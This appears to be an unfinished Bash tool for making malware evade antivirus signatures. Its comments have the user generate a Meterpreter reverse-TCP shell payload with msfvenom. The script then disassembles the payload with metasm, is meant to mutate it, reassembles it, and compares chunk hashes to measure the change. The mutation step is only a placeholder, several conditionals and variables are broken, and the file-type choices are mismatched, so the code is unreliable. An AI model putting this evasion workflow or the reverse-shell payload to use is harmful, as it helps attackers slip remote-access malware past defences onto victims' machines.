#
#  $WITH$$\ $$\   $$\  $THE$$\   QUARTERS\ $BY$OUR$\ $SIDE$\
#  \__$$  __|$$ |  $$ |$$  __$$\ $$  __$$\\__$$  __|$$  __$$\
#     $$ |   $$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |
#     $$ |   ALL$WILL |$BOW$$$$ |$TO$OUR\ |  $$ |   $$ |  $$ |
#     $$ |   $$  __$$ |$$  __$$ |$$  __$$\   $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$POWERS$ |  $$ |    $$$$$$  |
#     \__|   \__|  \__|\__|  \__|\_______/   \__|    \______/



# Prerequisite
# sudo gem update; sudo gem install metasm

#First generate a raw payload using msfvenom
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=443 -f raw > raw_binary

# Then call thabto.sh like so
# ./thabto.sh /path/to/raw_binary /path/to/output_file
cp $(locate disassemble.rb | grep "samples" | head -1) ./disassemble.rb
chmod +x disassemble.rb

read -n1 -p "[E]LF/[M]ach-o/e[X]e/[P*]E?: " FILETYPE </dev/tty
echo
case $FILETYPE in
    [eE]*) cp $(locate elfencode.rb | head -1) ./encode.rb
        ;;
    [mM]*) cp $(locate exeencode.rb | head -1) ./encode.rb
        ;;
    [xX]*) cp $(locate machoencode.rb | head -1) ./encode.rb
        ;;
    *) cp $(locate peencode.rb | head -1) ./encode.rb
        ;;
esac

chmod +x encode.rb

RAW_LOC="$1"

# If binary is smaller than 10k, break into 20 pieces.
FILESIZE=$(stat -c%s "$RAW_LOC")
mkdir splits
cd splits
if $FILESIZE -le 10240
then
    split -n 20 "../$RAW_LOC"
else
    # Otherwise, 512-byte chunks.
    split -b 512 "../$RAW_LOC"
fi

# Generate original hashes
TOTAL=0
for f in x*
do
    sha256sum $f >> ../OG_SUMS
    (( TOTAL += 1 ))
done

cd ../
rm -r splits

# Disassemble
./disassemble.rb $RAW_LOC > asm_code.asm

sed -i "1s/^/\.section \'\.text\' rwx\n\.entrypoint\n/" asm_code.asm

# While change threshold not reached:

# Randomly apply a rule


# Re-assemble
./encode asm_code.asm -o payload

# Generate new hashes
mkdir splits
cd splits
if $FILESIZE -le 10240
then
    split -n 20 "../$payload"
else
    # Otherwise, 512-byte chunks.
    split -b 512 "../$payload"
fi
# Generate original hashes
for f in x*
do
    sha256sum $f >> ../NEW_SUMS
done

cd ../
rm -r splits

# Compare new hashes to old hashes to determine % change
$((100 * CHANGED/TOTAL))
#/while
: << CLEAN_UP
rm encode.rb disassemble.rb asm_code.asm $RAW_LOC
CLEAN_UP
